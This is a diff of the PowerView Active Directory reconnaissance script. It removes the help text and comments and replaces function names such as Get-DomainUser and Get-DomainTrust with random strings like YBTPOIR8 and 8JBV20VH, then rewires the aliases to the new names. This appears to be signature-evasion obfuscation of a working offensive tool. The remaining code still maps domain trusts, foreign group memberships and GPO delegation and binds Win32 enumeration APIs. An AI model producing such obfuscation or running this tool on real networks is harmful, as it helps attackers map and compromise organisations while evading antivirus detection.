@@ -20082,7 +12326,7 @@ Custom PSObject with translated user property fields.
     }
 
     PROCESS {
-        Get-DomainUser @SearcherArguments  | ForEach-Object {
+        YBTPOIR8 @SearcherArguments  | ForEach-Object {
             ForEach ($Membership in $_.memberof) {
                 $Index = $Membership.IndexOf('DC=')
                 if ($Index) {
@@ -20093,7 +12337,7 @@ Custom PSObject with translated user property fields.
                     $UserDomain = $($_.distinguishedname.SubString($UserIndex)) -replace 'DC=','' -replace ',','.'
 
                     if ($GroupDomain -ne $UserDomain) {
-                        # if the group domain doesn't match the user domain, display it
+                        
                         $GroupName = $Membership.Split(',')[0].split('=')[1]
                         $ForeignUser = New-Object PSObject
                         $ForeignUser | Add-Member Noteproperty 'UserDomain' $UserDomain
@@ -20112,98 +12356,8 @@ Custom PSObject with translated user property fields.
 }
 
 
-function Get-DomainForeignGroupMember {
-<#
-.SYNOPSIS
+function PUV1GVGM {
 
-Enumerates groups with users outside of the group's domain and returns
-each foreign member. This is a domain's "incoming" access.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-Domain, Get-DomainGroup  
-
-.DESCRIPTION
-
-Uses Get-DomainGroup to enumerate all groups for the current (or target) domain,
-then enumerates the members of each group, and compares the member's domain
-name to the parent group's domain name, outputting the member if the domains differ.
-
-.PARAMETER Domain
-
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER LDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory objects.
-
-.PARAMETER Properties
-
-Specifies the properties of the output object to retrieve from the server.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER SecurityMasks
-
-Specifies an option for examining security information of a directory object.
-One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-DomainForeignGroupMember
-
-Return all group members in the current domain where the group and member differ.
-
-.EXAMPLE
-
-Get-DomainForeignGroupMember -Domain dev.testlab.local
-
-Return all group members in the dev.testlab.local domain where the member is not in dev.testlab.local.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-DomainForeignGroupMember -Domain dev.testlab.local -Server secondary.dev.testlab.local -Credential $Cred
-
-Return all group members in the dev.testlab.local domain where the member is
-not in dev.testlab.local. binding to the secondary.dev.testlab.local for
-queries, and using the specified alternate credentials.
-
-.OUTPUTS
-
-PowerView.ForeignGroupMember
-
-Custom PSObject with translated group member property fields.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.ForeignGroupMember')]
@@ -20275,17 +12429,17 @@ Custom PSObject with translated group member property fields.
     }
 
     PROCESS {
-        # standard group names to ignore
+        
         $ExcludeGroups = @('Users', 'Domain Users', 'Guests')
 
-        Get-DomainGroup @SearcherArguments | Where-Object { $ExcludeGroups -notcontains $_.samaccountname } | ForEach-Object {
+        H3GAYKFB @SearcherArguments | Where-Object { $ExcludeGroups -notcontains $_.samaccountname } | ForEach-Object {
             $GroupName = $_.samAccountName
             $GroupDistinguishedName = $_.distinguishedname
             $GroupDomain = $GroupDistinguishedName.SubString($GroupDistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
 
             $_.member | ForEach-Object {
-                # filter for foreign SIDs in the cn field for users in another domain,
-                #   or if the DN doesn't end with the proper DN for the queried domain
+                
+                
                 $MemberDomain = $_.SubString($_.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                 if (($_ -match 'CN=S-1-5-21.*-.*') -or ($GroupDomain -ne $MemberDomain)) {
                     $MemberDistinguishedName = $_
@@ -20307,116 +12461,8 @@ Custom PSObject with translated group member property fields.
 }
 
 
-function Get-DomainTrustMapping {
-<#
-.SYNOPSIS
+function 8JBV20VHMapping {
 
-This function enumerates all trusts for the current domain and then enumerates
-all trusts for each domain it finds.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-Domain, Get-DomainTrust, Get-ForestTrust  
-
-.DESCRIPTION
-
-This function will enumerate domain trust relationships for the current domain using
-a number of methods, and then enumerates all trusts for each found domain, recursively
-mapping all reachable trust relationships. By default, and LDAP search using the filter
-'(objectClass=trustedDomain)' is used- if any LDAP-appropriate parameters are specified
-LDAP is used as well. If the -NET flag is specified, the .NET method
-GetAllTrustRelationships() is used on the System.DirectoryServices.ActiveDirectory.Domain
-object. If the -API flag is specified, the Win32 API DsEnumerateDomainTrusts() call is
-used to enumerate instead. If any 
-
-.PARAMETER API
-
-Switch. Use an API call (DsEnumerateDomainTrusts) to enumerate the trusts instead of the
-built-in LDAP method.
-
-.PARAMETER NET
-
-Switch. Use .NET queries to enumerate trusts instead of the default LDAP method.
-
-.PARAMETER LDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory objects.
-
-.PARAMETER Properties
-
-Specifies the properties of the output object to retrieve from the server.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-DomainTrustMapping | Export-CSV -NoTypeInformation trusts.csv
-
-Map all reachable domain trusts using .NET methods and output everything to a .csv file.
-
-.EXAMPLE
-
-Get-DomainTrustMapping -API | Export-CSV -NoTypeInformation trusts.csv
-
-Map all reachable domain trusts using Win32 API calls and output everything to a .csv file.
-
-.EXAMPLE
-
-Get-DomainTrustMapping -NET | Export-CSV -NoTypeInformation trusts.csv
-
-Map all reachable domain trusts using .NET methods and output everything to a .csv file.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-DomainTrustMapping -Server 'PRIMARY.testlab.local' | Export-CSV -NoTypeInformation trusts.csv
-
-Map all reachable domain trusts using LDAP, binding to the PRIMARY.testlab.local server for queries
-using the specified alternate credentials, and output everything to a .csv file.
-
-.OUTPUTS
-
-PowerView.DomainTrust.LDAP
-
-Custom PSObject with translated domain LDAP trust result fields (default).
-
-PowerView.DomainTrust.NET
-
-A TrustRelationshipInformationCollection returned when using .NET methods.
-
-PowerView.DomainTrust.API
-
-Custom PSObject with translated domain API trust result fields.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.DomainTrust.NET')]
@@ -20481,10 +12527,10 @@ Custom PSObject with translated domain API trust result fields.
         $Credential = [Management.Automation.PSCredential]::Empty
     )
 
-    # keep track of domains seen so we don't hit infinite recursion
+    
     $SeenDomains = @{}
 
-    # our domain status tracker
+    
     $Domains = New-Object System.Collections.Stack
 
     $DomainTrustArguments = @{}
@@ -20500,7 +12546,7 @@ Custom PSObject with translated domain API trust result fields.
     if ($PSBoundParameters['Tombstone']) { $DomainTrustArguments['Tombstone'] = $Tombstone }
     if ($PSBoundParameters['Credential']) { $DomainTrustArguments['Credential'] = $Credential }
 
-    # get the current domain and push it onto the stack
+    
     if ($PSBoundParameters['Credential']) {
         $CurrentDomain = (Get-Domain -Credential $Credential).Name
     }
@@ -20513,29 +12559,29 @@ Custom PSObject with translated domain API trust result fields.
 
         $Domain = $Domains.Pop()
 
-        # if we haven't seen this domain before
+        
         if ($Domain -and ($Domain.Trim() -ne '') -and (-not $SeenDomains.ContainsKey($Domain))) {
 
-            Write-Verbose "[Get-DomainTrustMapping] Enumerating trusts for domain: '$Domain'"
+            Write-Verbose "[8JBV20VHMapping] Enumerating trusts for domain: '$Domain'"
 
-            # mark it as seen in our list
+            
             $Null = $SeenDomains.Add($Domain, '')
 
             try {
-                # get all the trusts for this domain
+                
                 $DomainTrustArguments['Domain'] = $Domain
-                $Trusts = Get-DomainTrust @DomainTrustArguments
+                $Trusts = 8JBV20VH @DomainTrustArguments
 
                 if ($Trusts -isnot [System.Array]) {
                     $Trusts = @($Trusts)
                 }
 
-                # get any forest trusts, if they exist
+                
                 if ($PsCmdlet.ParameterSetName -eq 'NET') {
                     $ForestTrustArguments = @{}
                     if ($PSBoundParameters['Forest']) { $ForestTrustArguments['Forest'] = $Forest }
                     if ($PSBoundParameters['Credential']) { $ForestTrustArguments['Credential'] = $Credential }
-                    $Trusts += Get-ForestTrust @ForestTrustArguments
+                    $Trusts += SVUMSAEL @ForestTrustArguments
                 }
 
                 if ($Trusts) {
@@ -20543,10 +12589,10 @@ Custom PSObject with translated domain API trust result fields.
                         $Trusts = @($Trusts)
                     }
 
-                    # enumerate each trust found
+                    
                     ForEach ($Trust in $Trusts) {
                         if ($Trust.SourceName -and $Trust.TargetName) {
-                            # make sure we process the target
+                            
                             $Null = $Domains.Push($Trust.TargetName)
                             $Trust
                         }
@@ -20554,7 +12600,7 @@ Custom PSObject with translated domain API trust result fields.
                 }
             }
             catch {
-                Write-Verbose "[Get-DomainTrustMapping] Error: $_"
+                Write-Verbose "[8JBV20VHMapping] Error: $_"
             }
         }
     }
@@ -20562,35 +12608,7 @@ Custom PSObject with translated domain API trust result fields.
 
 
 function Get-GPODelegation {
-<#
-.SYNOPSIS
 
-Finds users with write permissions on GPO objects which may allow privilege escalation within the domain.
-
-Author: Itamar Mizrahi (@MrAnde7son)  
-License: BSD 3-Clause  
-Required Dependencies: None  
-
-.PARAMETER GPOName
-
-The GPO display name to query for, wildcards accepted.
-
-.PARAMETER PageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.EXAMPLE
-
-Get-GPODelegation
-
-Returns all GPO delegations in current forest.
-
-.EXAMPLE
-
-Get-GPODelegation -GPOName
-
-Returns all GPO delegations on a given GPO.
-#>
 
     [CmdletBinding()]
     Param (
@@ -20630,20 +12648,20 @@ Returns all GPO delegations on a given GPO.
 }
 
 
-########################################################
-#
-# Expose the Win32API functions and datastructures below
-# using PSReflect.
-# Warning: Once these are executed, they are baked in
-# and can't be changed while the script is running!
-#
-########################################################
 
-$Mod = New-InMemoryModule -ModuleName Win32
 
-# [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPositionalParameters', Scope='Function', Target='psenum')]
 
-# used to parse the 'samAccountType' property for users/computers/groups
+
+
+
+
+
+
+$Mod = 9732B1QN -ModuleName Win32
+
+
+
+
 $SamAccountTypeEnum = psenum $Mod PowerView.SamAccountTypeEnum UInt32 @{
     DOMAIN_OBJECT                   =   '0x00000000'
     GROUP_OBJECT                    =   '0x10000000'
@@ -20658,7 +12676,7 @@ $SamAccountTypeEnum = psenum $Mod PowerView.SamAccountTypeEnum UInt32 @{
     ACCOUNT_TYPE_MAX                =   '0x7fffffff'
 }
 
-# used to parse the 'grouptype' property for groups
+
 $GroupTypeEnum = psenum $Mod PowerView.GroupTypeEnum UInt32 @{
     CREATED_BY_SYSTEM               =   '0x00000001'
     GLOBAL_SCOPE                    =   '0x00000002'
@@ -20669,7 +12687,7 @@ $GroupTypeEnum = psenum $Mod PowerView.GroupTypeEnum UInt32 @{
     SECURITY                        =   '0x80000000'
 } -Bitfield
 
-# used to parse the 'userAccountControl' property for users/groups
+
 $UACEnum = psenum $Mod PowerView.UACEnum UInt32 @{
     SCRIPT                          =   1
     ACCOUNTDISABLE                  =   2
@@ -20695,7 +12713,7 @@ $UACEnum = psenum $Mod PowerView.UACEnum UInt32 @{
     PARTIAL_SECRETS_ACCOUNT         =   67108864
 } -Bitfield
 
-# enum used by $WTS_SESSION_INFO_1 below
+
 $WTSConnectState = psenum $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
     Active       =    0
     Connected    =    1
@@ -20709,7 +12727,7 @@ $WTSConnectState = psenum $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
     Init         =    9
 }
 
-# the WTSEnumerateSessionsEx result structure
+
 $WTS_SESSION_INFO_1 = struct $Mod PowerView.RDPSessionInfo @{
     ExecEnvId = field 0 UInt32
     State = field 1 $WTSConnectState
@@ -20721,20 +12739,20 @@ $WTS_SESSION_INFO_1 = struct $Mod PowerView.RDPSessionInfo @{
     pFarmName = field 7 String -MarshalAs @('LPWStr')
 }
 
-# the particular WTSQuerySessionInformation result structure
+
 $WTS_CLIENT_ADDRESS = struct $mod WTS_CLIENT_ADDRESS @{
     AddressFamily = field 0 UInt32
     Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
 }
 
-# the NetShareEnum result structure
+
 $SHARE_INFO_1 = struct $Mod PowerView.ShareInfo @{
     Name = field 0 String -MarshalAs @('LPWStr')
     Type = field 1 UInt32
     Remark = field 2 String -MarshalAs @('LPWStr')
 }
 
-# the NetWkstaUserEnum result structure
+
 $WKSTA_USER_INFO_1 = struct $Mod PowerView.LoggedOnUserInfo @{
     UserName = field 0 String -MarshalAs @('LPWStr')
     LogonDomain = field 1 String -MarshalAs @('LPWStr')
@@ -20742,7 +12760,7 @@ $WKSTA_USER_INFO_1 = struct $Mod PowerView.LoggedOnUserInfo @{
     LogonServer = field 3 String -MarshalAs @('LPWStr')
 }
 
-# the NetSessionEnum result structure
+
 $SESSION_INFO_10 = struct $Mod PowerView.SessionInfo @{
     CName = field 0 String -MarshalAs @('LPWStr')
     UserName = field 1 String -MarshalAs @('LPWStr')
@@ -20750,7 +12768,7 @@ $SESSION_INFO_10 = struct $Mod PowerView.SessionInfo @{
     IdleTime = field 3 UInt32
 }
 
-# enum used by $LOCALGROUP_MEMBERS_INFO_2 below
+
 $SID_NAME_USE = psenum $Mod SID_NAME_USE UInt16 @{
     SidTypeUser             = 1
     SidTypeGroup            = 2
@@ -20763,20 +12781,20 @@ $SID_NAME_USE = psenum $Mod SID_NAME_USE UInt16 @{
     SidTypeComputer         = 9
 }
 
-# the NetLocalGroupEnum result structure
+
 $LOCALGROUP_INFO_1 = struct $Mod LOCALGROUP_INFO_1 @{
     lgrpi1_name = field 0 String -MarshalAs @('LPWStr')
     lgrpi1_comment = field 1 String -MarshalAs @('LPWStr')
 }
 
-# the NetLocalGroupGetMembers result structure
+
 $LOCALGROUP_MEMBERS_INFO_2 = struct $Mod LOCALGROUP_MEMBERS_INFO_2 @{
     lgrmi2_sid = field 0 IntPtr
     lgrmi2_sidusage = field 1 $SID_NAME_USE
     lgrmi2_domainandname = field 2 String -MarshalAs @('LPWStr')
 }
 
-# enums used in DS_DOMAIN_TRUSTS
+
 $DsDomainFlag = psenum $Mod DsDomain.Flags UInt32 @{
     IN_FOREST       = 1
     DIRECT_OUTBOUND = 2
@@ -20801,7 +12819,7 @@ $DsDomainTrustAttributes = psenum $Mod DsDomain.TrustAttributes UInt32 @{
     TREAT_AS_EXTERNAL   = 64
 }
 
-# the DsEnumerateDomainTrusts result structure
+
 $DS_DOMAIN_TRUSTS = struct $Mod DS_DOMAIN_TRUSTS @{
     NetbiosDomainName = field 0 String -MarshalAs @('LPWStr')
     DnsDomainName = field 1 String -MarshalAs @('LPWStr')
@@ -20813,7 +12831,7 @@ $DS_DOMAIN_TRUSTS = struct $Mod DS_DOMAIN_TRUSTS @{
     DomainGuid = field 7 Guid
 }
 
-# used by WNetAddConnection2W
+
 $NETRESOURCEW = struct $Mod NETRESOURCEW @{
     dwScope =         field 0 UInt32
     dwType =          field 1 UInt32
@@ -20825,7 +12843,7 @@ $NETRESOURCEW = struct $Mod NETRESOURCEW @{
     lpProvider =      field 7 String -MarshalAs @('LPWStr')
 }
 
-# all of the Win32 API functions we need
+
 $FunctionDefinitions = @(
     (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
     (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
@@ -20862,53 +12880,53 @@ $Kernel32 = $Types['kernel32']
 Set-Alias Get-IPAddress Resolve-IPAddress
 Set-Alias Convert-NameToSid ConvertTo-SID
 Set-Alias Convert-SidToName ConvertFrom-SID
-Set-Alias Request-SPNTicket Get-DomainSPNTicket
-Set-Alias Get-DNSZone Get-DomainDNSZone
-Set-Alias Get-DNSRecord Get-DomainDNSRecord
+Set-Alias Request-SPNTicket 4DS1B0PY
+Set-Alias Get-DNSZone INWPZXLC
+Set-Alias Get-DNSRecord X6YBHBNN
 Set-Alias Get-NetDomain Get-Domain
-Set-Alias Get-NetDomainController Get-DomainController
+Set-Alias Get-NetDomainController RP7TH4PM
 Set-Alias Get-NetForest Get-Forest
-Set-Alias Get-NetForestDomain Get-ForestDomain
-Set-Alias Get-NetForestCatalog Get-ForestGlobalCatalog
-Set-Alias Get-NetUser Get-DomainUser
-Set-Alias Get-UserEvent Get-DomainUserEvent
-Set-Alias Get-NetComputer Get-DomainComputer
-Set-Alias Get-ADObject Get-DomainObject
-Set-Alias Set-ADObject Set-DomainObject
-Set-Alias Get-ObjectAcl Get-DomainObjectAcl
-Set-Alias Add-ObjectAcl Add-DomainObjectAcl
-Set-Alias Invoke-ACLScanner Find-InterestingDomainAcl
-Set-Alias Get-GUIDMap Get-DomainGUIDMap
-Set-Alias Get-NetOU Get-DomainOU
-Set-Alias Get-NetSite Get-DomainSite
-Set-Alias Get-NetSubnet Get-DomainSubnet
-Set-Alias Get-NetGroup Get-DomainGroup
-Set-Alias Find-ManagedSecurityGroups Get-DomainManagedSecurityGroup
-Set-Alias Get-NetGroupMember Get-DomainGroupMember
-Set-Alias Get-NetFileServer Get-DomainFileServer
-Set-Alias Get-DFSshare Get-DomainDFSShare
-Set-Alias Get-NetGPO Get-DomainGPO
-Set-Alias Get-NetGPOGroup Get-DomainGPOLocalGroup
-Set-Alias Find-GPOLocation Get-DomainGPOUserLocalGroupMapping
-Set-Alias Find-GPOComputerAdmin Get-DomainGPOComputerLocalGroupMapping
-Set-Alias Get-LoggedOnLocal Get-RegLoggedOn
-Set-Alias Invoke-CheckLocalAdminAccess Test-AdminAccess
-Set-Alias Get-SiteName Get-NetComputerSiteName
+Set-Alias Get-NetForestDomain 6H2K42C0
+Set-Alias Get-NetForestCatalog 6GBUTHZD
+Set-Alias Get-NetUser YBTPOIR8
+Set-Alias Get-UserEvent YBTPOIR8Event
+Set-Alias Get-NetComputer VVVCIHJ3
+Set-Alias Get-ADObject U3GGBSG9
+Set-Alias Set-ADObject IP5Z2840
+Set-Alias Get-ObjectAcl U3GGBSG9Acl
+Set-Alias Add-ObjectAcl 50YXE1CG
+Set-Alias Invoke-ACLScanner DFSAKZW7
+Set-Alias Get-GUIDMap KV9HMWD4
+Set-Alias Get-NetOU HM6W17ZN
+Set-Alias Get-NetSite XMOLM1NY
+Set-Alias Get-NetSubnet Q3KO0YTQ
+Set-Alias Get-NetGroup H3GAYKFB
+Set-Alias Find-ManagedSecurityGroups EK1641ZV
+Set-Alias Get-NetGroupMember H3GAYKFBMember
+Set-Alias Get-NetFileServer QIVRPO05
+Set-Alias Get-DFSshare LDL959ST
+Set-Alias Get-NetGPO 5I3AJMSK
+Set-Alias Get-NetGPOGroup 5I3AJMSKLocalGroup
+Set-Alias Find-GPOLocation 5I3AJMSKUserLocalGroupMapping
+Set-Alias Find-GPOComputerAdmin 5I3AJMSKComputerLocalGroupMapping
+Set-Alias Get-LoggedOnLocal VY8M1WWI
+Set-Alias Invoke-CheckLocalAdminAccess F32E8AKI
+Set-Alias Get-SiteName QNE3IO5Q
 Set-Alias Get-Proxy Get-WMIRegProxy
 Set-Alias Get-LastLoggedOn Get-WMIRegLastLoggedOn
 Set-Alias Get-CachedRDPConnection Get-WMIRegCachedRDPConnection
 Set-Alias Get-RegistryMountedDrive Get-WMIRegMountedDrive
 Set-Alias Get-NetProcess Get-WMIProcess
-Set-Alias Invoke-ThreadedFunction New-ThreadedFunction
-Set-Alias Invoke-UserHunter Find-DomainUserLocation
-Set-Alias Invoke-ProcessHunter Find-DomainProcess
-Set-Alias Invoke-EventHunter Find-DomainUserEvent
-Set-Alias Invoke-ShareFinder Find-DomainShare
-Set-Alias Invoke-FileFinder Find-InterestingDomainShareFile
-Set-Alias Invoke-EnumerateLocalAdmin Find-DomainLocalGroupMember
-Set-Alias Get-NetDomainTrust Get-DomainTrust
-Set-Alias Get-NetForestTrust Get-ForestTrust
-Set-Alias Find-ForeignUser Get-DomainForeignUser
-Set-Alias Find-ForeignGroup Get-DomainForeignGroupMember
-Set-Alias Invoke-MapDomainTrust Get-DomainTrustMapping
-Set-Alias Get-DomainPolicy Get-DomainPolicyData
+Set-Alias Invoke-ThreadedFunction 24K6KC7J
+Set-Alias Invoke-UserHunter MKNBJDOJ
+Set-Alias Invoke-ProcessHunter 9YE7TFUR
+Set-Alias Invoke-EventHunter 3FD4HVJP
+Set-Alias Invoke-ShareFinder R0HBKOMW
+Set-Alias Invoke-FileFinder Q2OLEVLP
+Set-Alias Invoke-EnumerateLocalAdmin V17KPZX8
+Set-Alias Get-NetDomainTrust 8JBV20VH
+Set-Alias Get-NetForestTrust SVUMSAEL
+Set-Alias Find-ForeignUser SZAAOS2T
+Set-Alias Find-ForeignGroup PUV1GVGM
+Set-Alias Invoke-MapDomainTrust 8JBV20VHMapping
+Set-Alias Get-DomainPolicy Q2KSRNB4
